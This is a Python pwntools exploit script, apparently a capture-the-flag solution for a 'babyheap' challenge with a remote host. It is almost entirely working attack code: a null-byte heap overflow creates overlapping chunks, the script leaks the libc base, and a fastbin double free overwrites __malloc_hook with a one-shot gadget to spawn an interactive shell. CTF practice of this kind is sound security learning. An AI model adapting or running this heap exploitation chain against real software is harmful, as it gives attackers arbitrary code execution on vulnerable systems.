from pwn import *

DEBUG = 1

if DEBUG == 1:
  r = process('./babyheap')
  context(log_level='debug')
  gdb.attach(r)
else:
  r = remote('babyheap.2018.teamroir.cn',3154)

def alloc(size, payload):
        r.sendlineafter('choice: ','1')
        r.sendlineafter('please input chunk size: ',str(size))
        r.sendafter('input chunk content: ',payload)
def show(index):
        r.sendlineafter('choice: ','2')
        r.sendlineafter('please input chunk index: ',str(index))
def delete(index):
        r.sendlineafter('choice: ','3')
        r.sendlineafter('please input chunk index: ',str(index))

#r = process('./babyheap', env={"LD_PRELOAD":"./libc.so.6"})

libc = ELF('./libc.so.6')
alloc(0xf0,'A' * 0xf0)#sb1
alloc(0x70,'A' * 0x70)#fb1
alloc(0xf0,'A' * 0xf0)#sb2
alloc(0x30,'A' * 0x30)#fb2 #3
delete(0)
delete(1)
# null byte heap overflow
# prev_size = 0x180
# prev_in_use = 0
alloc(0x78,'B' * 0x70 + p64(0x180))#0
# first fastbin gets overlapped
delete(2)
alloc(0xf0,'A' * 0xf0)
# libc leak
show(0)
r.recvuntil('content: ')
libc_base = u64(r.recv(6) + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
log.info("libc : " + hex(libc_base))
# fastbin Attack
# get the 0x280 byte chunk
delete(1)
# allocate 0x20 byte chunk to fill buffer
alloc(0x10, 'A' * 0x10)#1
alloc(0x60, 'B' * 0x60)#2
alloc(0x60, 'C' * 0x60)#4
# below chunk will be placed on same address as overlapped chunk
alloc(0x60, 'D' * 0x60)#5
# free overlapped chunk address twice
delete(5)
delete(4)
delete(0)
fake_chunk = libc_base + libc.symbols['__malloc_hook'] - 0x23
oneshot = libc_base + 0x4526a
alloc(0x60, p64(fake_chunk) + p64(0) + "H"*0x50)
alloc(0x60,'A' * 0x60)
alloc(0x60,'A' * 0x60) # fake __malloc_hook chunk gets added in free list
# overwrite __malloc_hook with oneshot
alloc(0x60,'A' * 0x13 + p64(oneshot) + "\n")
# trigger oneshot
r.sendlineafter("choice: ", "1")
r.sendlineafter(": ", "1")
r.interactive()
